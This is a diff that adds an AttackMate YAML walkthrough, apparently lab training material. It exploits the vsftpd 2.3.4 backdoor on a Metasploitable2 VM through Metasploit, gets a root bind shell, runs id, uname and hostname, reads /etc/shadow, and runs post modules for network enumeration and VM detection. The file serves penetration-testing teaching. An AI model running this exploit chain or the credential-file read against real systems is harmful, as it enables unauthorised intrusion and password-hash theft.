@@ -1,0 +1,122 @@
+#
+# Walkthrough 1: vsftpd 2.3.4 Backdoor
+#
+# Description:
+#     Guided walkthrough of exploiting the vsftpd backdoor on Metasploitable2,
+#     running post-exploitation commands in the resulting shell session, and
+#     gathering system information with a post module.
+#
+#     Attack steps:
+#     1. Exploit the vsftpd 2.3.4 backdoor to get a root shell session
+#     2. Verify access by running id and uname in the session
+#     3. Run a Metasploit post module to enumerate the network configuration
+#     4. Run a second post module to check if the target is a VM
+#
+# Background:
+#     The vsftpd 2.3.4 backdoor was inserted into the source code in 2011.
+#     When a login attempt uses a username ending in ":)", the server
+#     opens a command shell on port 6200. No credentials are needed.
+#     See handout 02_metasploit_integration.md for the manual walkthrough.
+#
+# Requirements:
+#     - Metasploitable2 VM running and reachable
+#     - msfrpcd running: msfrpcd -P msf -a 127.0.0.1
+#     - Run with: attackmate --config ../config.yml 01_vsftpd_backdoor.yml
+#
+# IMPORTANT: Replace METASPLOITABLE and ATTACKER with your actual IPs!
+#
+
+vars:
+  METASPLOITABLE: 10.110.0.31
+  ATTACKER: 10.10.6.14
+  PAYLOAD: cmd/unix/bind_ruby
+
+commands:
+  # ============================================
+  # STEP 1: Exploit the vsftpd backdoor
+  #
+  # The msf-module command runs the Metasploit exploit module.
+  # - cmd:             the module path in Metasploit
+  # - payload:         "cmd/unix/bind_ruby" ends a Ruby one-liner to the target that
+  #                     opens a bind shell on LPORT, which MSF then connects to directly
+  # - options/RHOSTS:  the target IP
+  # - creates_session: name we give to this session in AttackMate
+  #
+  # The exploit connects to the FTP port, sends the backdoor trigger,
+  # then sends cmd/unix/bind_ruby payload to port 6200 where the shell is waiting,
+  # which opens a new bind shell on port 4444 (default) that metasploit then connects to.
+  # This can take up to 30 seconds and may occasionally time out.
+  # ============================================
+  - type: debug
+    cmd: "Note: the vsftpd exploit can take up to 30 seconds. Please be patient."
+
+  - type: msf-module
+    cmd: exploit/unix/ftp/vsftpd_234_backdoor
+    payload: $PAYLOAD
+    options:
+      RHOSTS: $METASPLOITABLE
+    creates_session: shell
+
+  # ============================================
+  # STEP 2: Verify shell access
+  #
+  # msf-session sends commands to an active Metasploit session.
+  # The session name matches what we put in creates_session above.
+  # Output is captured in $RESULT_STDOUT after each command.
+  # ============================================
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  - type: debug
+    cmd: "Shell session user: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: shell
+    cmd: uname -a
+
+  - type: debug
+    cmd: "Target kernel: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: shell
+    cmd: hostname
+
+  # ============================================
+  # STEP 3: Read a sensitive file to prove access
+  #
+  # /etc/shadow stores hashed passwords and is readable only by root.
+  # Being able to read it confirms we are running as root.
+  # ============================================
+  - type: msf-session
+    session: shell
+    cmd: cat /etc/shadow
+
+  - type: debug
+    cmd: "Shadow file contents captured. We have root."
+
+  # ============================================
+  # STEP 4: Post module - enumerate network configuration
+  #
+  # Post modules run against an existing session.
+  # They use SESSION set to $LAST_MSF_SESSION, which is the
+  # numeric session ID Metasploit assigned when the exploit ran.
+  # ============================================
+  - type: debug
+    cmd: "Running post module. Metasploit session ID: $LAST_MSF_SESSION"
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_network
+    options:
+      SESSION: $LAST_MSF_SESSION
+
+  # ============================================
+  # STEP 5: Post module - check if target is a virtual machine
+  # ============================================
+  - type: msf-module
+    cmd: post/linux/gather/checkvm
+    options:
+      SESSION: $LAST_MSF_SESSION
+
+  - type: debug
+    cmd: "Walkthrough complete. Check output.log for results"
